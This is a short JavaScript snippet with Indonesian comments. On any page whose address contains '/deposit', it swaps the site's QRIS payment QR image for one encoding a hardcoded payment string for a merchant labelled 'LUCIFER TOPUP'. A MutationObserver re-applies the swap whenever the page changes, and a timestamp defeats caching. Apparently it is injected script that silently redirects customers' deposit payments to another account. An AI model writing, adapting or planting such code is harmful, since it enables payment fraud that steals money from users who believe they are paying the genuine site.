<script>
(function() {
  const url = window.location.href;

  // Hanya untuk halaman deposit (termasuk /deposit dan /deposit/)
  if (url.includes('/deposit')) {
    const newQR = "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=00020101021126760024ID.CO.SPEEDCASH.MERCHANT01189360081530002142180215ID10250021421860303UKE51440014ID.CO.QRIS.WWW0215ID10254347309470303UKE5204581653033605802ID5913LUCIFER%20TOPUP6005MEDAN61052022662330509S2696179801091263632820703A0163045DEA";

    function replaceQris() {
      const qrisImg = document.getElementById('qrisImage');
      if (qrisImg) {
        qrisImg.src = newQR + "&t=" + new Date().getTime(); // anti cache
      }
    }

    // Kalau sudah ada dari awal, langsung ganti
    replaceQris();

    // Observer untuk mendeteksi popup muncul (DOM berubah)
    const observer = new MutationObserver(() => {
      replaceQris();
    });

    observer.observe(document.body, {
      childList: true,
      subtree: true
    });
  }
})();
</script>
